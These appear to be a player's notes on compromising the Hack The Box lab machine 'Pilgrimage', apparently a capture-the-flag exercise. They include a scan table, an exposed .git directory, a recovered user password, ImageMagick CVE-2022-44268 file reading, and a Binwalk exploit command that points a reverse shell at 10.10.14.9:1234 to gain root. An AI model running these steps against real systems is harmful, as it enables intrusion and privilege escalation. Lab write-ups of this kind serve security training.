| HOST                          | PORT | PROTO | SERVICE | VERSION                |
| ----------------------------- | ---- | ----- | ------- | ---------------------- |
| 10.10.11.219 (pilgrimage.htb) | 22   | tcp   | OpenSSH | 8.4p1 Debian 5+deb11u1 |
| 10.10.11.219 (pilgrimage.htb) | 80   | tcp   | nginx   | 1.18.0                 |


## HEADERS
---
HTTP/1.1 301 Moved Permanently
Server: nginx/1.18.0
Date: Fri, 07 Jul 2023 22:32:51 GMT
Content-Type: text/html
Content-Length: 169
Connection: keep-alive
Location: http://pilgrimage.htb/

---

## DIRECTORIES
---
/.git/

---

## USERS
---
emily : abigchonkyboi123

---

## NOTES
---
* shrinks images, can login/register
* nginx, php
* /.git/ directory
* `git-dumper http://pilgrimage.htb/.git/ dump` dumps the entire repository including all of the source code
* repository contains `magick` binary which is used to convert the image
* `./magick -version` outputs the version `7.1.0-49`
* https://github.com/voidz0r/CVE-2022-44268 clone it
* `/var/db/pilgrimage` sqlite db, found in `dashboard.php`
* `cargo run "/var/db/pilgrimage"`, upload the image
* download the resized image, `identify -verbose imagename`
* copy/paste hex output into cyberchef to get emily's password 
* `pspy64` reveals `/bin/bash /usr/sbin/malwarescan.sh` running as root user
* script uses `binwalk` to scan new files
* `Binwalk v2.3.2`
* https://vulners.com/exploitdb/EDB-ID:51249 `python3 exploit.py image.png 10.10.14.9 1234` 
* download on victim machine and copy to the folder `cp binwalk_exploit.png /var/www/pilgrimage.htb/shrunk/binwalk_exploit.png` with a listener up


---
